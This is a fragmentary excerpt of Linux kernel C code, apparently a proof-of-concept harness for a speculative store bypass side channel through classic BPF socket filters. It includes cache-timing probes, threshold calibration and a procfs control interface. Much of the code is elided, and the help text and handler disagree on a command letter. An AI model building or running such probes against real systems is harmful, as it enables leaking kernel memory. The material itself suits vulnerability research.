...
u8 cbpf_poc_stale_value = 0xaa;
s16 cbpf_poc_stale_stack_off = -20;
u8 cbpf_poc_stale_slot;
 ...
 * ARCH = frag[8] (M[k]=0 architectural P[X] target, warmed every call);
 * SIG  = frag[0] (speculative SSB P[X] target, warmed iff stale bit = 1);
 * COLD = frag[4] (never addressed; noise floor).  HDR is the byte offset the
 * gadget reads within a frag page, so we time the same 64B line.
 * Generated by: GPT-5 -- aligned the in-kernel timing probe with the retained
 * frag[0] signal gadget after the top-level cleanup. */
#define CPOC_HDR        32u
#define CPOC_ARCH_FRAG  8
#define CPOC_SIG_FRAG   0
#define CPOC_COLD_FRAG  4
#define CPOC_MAX2(a, b) (((a) > (b)) ? (a) : (b))
#define CPOC_MAX_FRAG   CPOC_MAX2(CPOC_MAX2(CPOC_ARCH_FRAG, CPOC_SIG_FRAG), \
				   CPOC_COLD_FRAG)
#define CPOC_COLDPROBE_FRAG 1
#define CPOC_COLDPROBE_OFF  256u
 ...
 * so the readout cannot re-warm the frags).  The pre-filter coldness diagnostic
 * is opt-in: the frag[0] in-kernel path needs no data load between flush and the
 * socket filter.  Generated by: GPT-5. */
static u64  cpoc_thr;
static bool cpoc_calibrated;
static bool cbpf_poc_probe_enabled = true;
static bool cbpf_poc_coldprobe_enabled;
...
static noinline void cbpf_poc_probe_coldness(struct sk_buff *skb)
{
	 ...
	 * payload. */
	if (skb_shinfo(skb)->nr_frags > CPOC_COLDPROBE_FRAG) {
		const skb_frag_t *f = &skb_shinfo(skb)->frags[CPOC_COLDPROBE_FRAG];
		struct page *pg = skb_frag_page(f);

		if (!pg || skb_frag_size(f) <= CPOC_COLDPROBE_OFF)
			return;
		p = (const volatile u8 *)page_address(pg) + skb_frag_off(f) + CPOC_COLDPROBE_OFF;
		cpoc_nfrag++;
	} else {
		if (skb->len < 512)
			return;
 ...
 * architectural P[X] (M[k]=0 path) warms ARCH every call; its speculative P[X]
...
static noinline void cbpf_poc_probe_signal(struct sk_buff *skb)
{
	...
	if (skb_shinfo(skb)->nr_frags <= CPOC_MAX_FRAG)
		return;
...
static int cbpf_poc_show(struct seq_file *m, void *v)
{
	...
	seq_printf(m, "stale=0x%02x inject=0x%02x stack_off=%d slot=%u\n",
	...
	seq_printf(m, "probe_enabled=%d coldprobe_enabled=%d ssbd_filter=%d thr=%llu calibrated=%d\n",
		   cbpf_poc_probe_enabled, cbpf_poc_coldprobe_enabled,
 ...
 *   'd' / 'D' -- enable / disable the pre-filter coldness diagnostic
			      ...
			      size_t len, loff_t *off)
{
	...
	if (c == 'c') {
		...
		cbpf_poc_coldprobe_enabled = true;
	} else if (c == 'D') {
		cbpf_poc_coldprobe_enabled = false;
	} else if (c == 's') {
		...
		if (!kstrtouint(buf + 1, 0, &v) && v < BPF_MEMWORDS) {
			cbpf_poc_stale_slot = (u8)v;
			cbpf_poc_stale_stack_off = -20 - 4 * (s16)v;
		}
	}
	return len;
}
	   ...
	   data, int, headlen, int, offset)
{
	 ...
	 * comment above).  This executes architecturally for the M[k]=0 path and
